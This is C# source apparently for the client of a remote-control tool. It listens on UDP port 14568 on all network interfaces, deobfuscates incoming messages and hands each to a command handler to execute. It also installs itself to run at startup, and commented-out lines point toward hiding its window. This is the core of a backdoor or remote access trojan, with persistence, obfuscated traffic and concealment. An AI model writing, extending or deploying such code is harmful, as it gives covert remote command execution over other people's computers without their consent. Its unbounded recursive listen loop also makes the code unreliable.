using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using Client.Commands;
using System.IO;
namespace Client
{
    internal class Program
    {
        
        private static CommandHandler ch;
        private static StartUPHandler sh;
        private static Socket s;
        static void Main(string[] args)
        {

            ch = new CommandHandler();
            sh = new StartUPHandler();

            s = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            s.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            s.Bind(new IPEndPoint(IPAddress.IPv6Any, 14568));

            //SendCmd("Tuning In");
            Task t = Task.Factory.StartNew(listen);

            if (!(sh.IsFileExistis()))
            {
                sh.AddTOStartUp();
                //sh.moveRunningWindow();

            }
           // sh.HideWindow();


            Console.WriteLine(".....");

            //string x = "hello world";
            //Console.WriteLine(x);
            //string y = x.obfuscate();
            //Console.WriteLine(x.obfuscate());
            //Console.WriteLine(y.deobfuscate());

            Console.ReadKey();
        }

        public static void listen()
        {
            IPEndPoint ipep = new IPEndPoint(IPAddress.IPv6Any,0);
            EndPoint ep = ipep as EndPoint;
            Byte[] data = new Byte[65535];
            s.ReceiveFrom(data, ref ep);
            List<Byte> bytes = new List<Byte>(data); // Becuse we dont know the length of the array
            bytes.RemoveAll(b => b == 0); // 65535 is a very large number so it will remove the empty ones
            Console.WriteLine(ch.runCommand(Encoding.UTF8.GetString(bytes.ToArray()).deobfuscate()));
            
            listen(); //recursive function becuse you dont know how many commands will be sent

        }
        public static void SendCmd(string cmd)
        {

            Socket s = new Socket(AddressFamily.InterNetworkV6, SocketType.Dgram, ProtocolType.Udp);
            s.SetSocketOption(SocketOptionLevel.IPv6, SocketOptionName.IPv6Only, false);
            IPEndPoint ipep = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 14567);
            Byte[] data = Encoding.UTF8.GetBytes(cmd.obfuscate());
            s.SendTo(data, ipep);
        }


    }
}
